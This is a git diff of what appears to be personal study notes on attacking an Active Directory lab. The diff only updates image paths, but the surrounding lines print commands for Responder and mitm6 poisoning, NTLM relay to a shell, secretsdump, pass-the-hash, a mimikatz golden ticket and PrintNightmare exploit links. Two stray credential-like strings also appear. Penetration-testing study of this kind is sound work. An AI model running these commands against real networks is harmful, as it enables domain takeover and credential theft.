@@ -1,7 +1,6 @@
 HYDRA-DC 10.0.2.250
 punisher 10.0.2.220
 spiderman 10.0.2.221
-
 # INTERNAL ATTACKS
 1. Start with mitm6 and responder
 2. Scan to generate traffic
@@ -35,7 +34,7 @@ hashcat basic attacks
 
 ```
 For example
-![[Pasted image 20250218154356.png]]
+![[../../Pasted image 20250218154356.png]]
 ## SMB Relay
 *Use responder to catch and relay hashes to gain control of a system (pass-the-hash)*
 
@@ -57,7 +56,7 @@ sudo vim /etc/responder/Responder.conf
 or
 sudo vim /usr/share/responder/Responder.conf
 ```
-![[Pasted image 20250219153007.png]]
+![[../../Pasted image 20250219153007.png]]
 **Run Responder**
 ```
 sudo responder -I <interface> -dP
@@ -71,18 +70,18 @@ sudo ntlmrelayx.py -tf targets.txt -smb2support
 sudo impacket-ntlmrelayx -tf targets.txt -smb2support
 ```
 Now you should receive alerts as they come in and be able to connect
-![[Pasted image 20250429220147.png]]
+![[../../Pasted image 20250429220147.png]]
 Now if you want to connect use the command
 ```
 sudo impacket-ntlmrelayx -tf targets.txt -smb2support -i
 ```
 to interface with the box. That will look like this 
-![[Pasted image 20250429220318.png]]
+![[../../Pasted image 20250429220318.png]]
 then to connect use the command
 ```
 nc 127.0.0.1 11000
 ```
-![[Pasted image 20250429220425.png]]
+![[../../Pasted image 20250429220425.png]]
 which will open a prompt to control the machine.
 You can also add the -c tag to execute commands on the machine like this
 ```
@@ -128,20 +127,20 @@ sudo mitm6 -d <domain>
 impacket-ntlmrelayx -6 -t ldaps://<DC-IPv4> -wh <fakeservicename>.<domain>.<local (if applicable)> -l <host loot folder>
 ```
 Now wait for events and check the loot folder and you should see things like
-![[Pasted image 20250430093930.png]]
+![[../../Pasted image 20250430093930.png]]
 
-![[Pasted image 20250430093906.png]]
+![[../../Pasted image 20250430093906.png]]
 Going into Domain users by group we see
-![[Pasted image 20250430094337.png]]
-![[Pasted image 20250430094006.png]]
+![[../../Pasted image 20250430094337.png]]
+![[../../Pasted image 20250430094006.png]]
 Now if we wait for an admin to login we see
 
-![[Pasted image 20250430112926.png]]
+![[../../Pasted image 20250430112926.png]]
 To run the secrets-dump script use
 ```
 impacket-secretsdump <Domain>/<DU-User>:'<DU-Pass>'@<DC-IP>
 ```
-![[Pasted image 20250430115017.png]]
+![[../../Pasted image 20250430115017.png]]
 qKaDjJwNBv:9lg1PhKV4Prk{m3 
 MeVInaZbgo:(E1kbB@j7#->qh( 
 ## Passback Attack
@@ -187,9 +186,9 @@ Now we will use the bloodhound-python ingester
 ```
 sudo bloodhound-python -d <domain> -u <User> -p <Password> -ns <IP> -c all
 ```
-![[Pasted image 20250430142413.png]]
-![[Pasted image 20250430142408.png]]
-![[Pasted image 20250430142458.png]]
+![[../../Pasted image 20250430142413.png]]
+![[../../Pasted image 20250430142408.png]]
+![[../../Pasted image 20250430142458.png]]
 There are lots if different avenues to pursue here, and a huge strength of it is being able to visualize AD structures/trusts/relationships.
 ## Plumhound
 *A Bloodhound wrapper designed to create AD reports*
@@ -235,6 +234,7 @@ For LSASS dump
 ```
 crackmapexec smb <ip/CIDR> -u <user> -h <hash> --local-auth
 ```
+![[../../cheatsheet-using-crackmapexec.pdf]]
 ## Kerberoasting
 
 Grab SPN's, and dump hashes
@@ -380,7 +380,7 @@ Start by running mimikatz
 privilege:debug
 lsadump::lsa /inject /name:krbtgt
 ```
-![[Pasted image 20250506150842.png]]
+![[../../Pasted image 20250506150842.png]]
 ```
 kerberos::golden /User:<User> /domain:<domain> /sid:<SID> /krbtgt:<krbtgt> /id:500 /ptt
 ```
@@ -399,3 +399,5 @@ If you do run this, **make sure to change the password back, otherwise it will s
 *Probably don't run it, just scan for it*
 [CVE](https://github.com/cube0x0/CVE-2021-1675) Information
 [Exploit](https://github.com/calebstewart/CVE-2021-1675) Information
+
+![[../../AD_cheatsheet.jpg]]
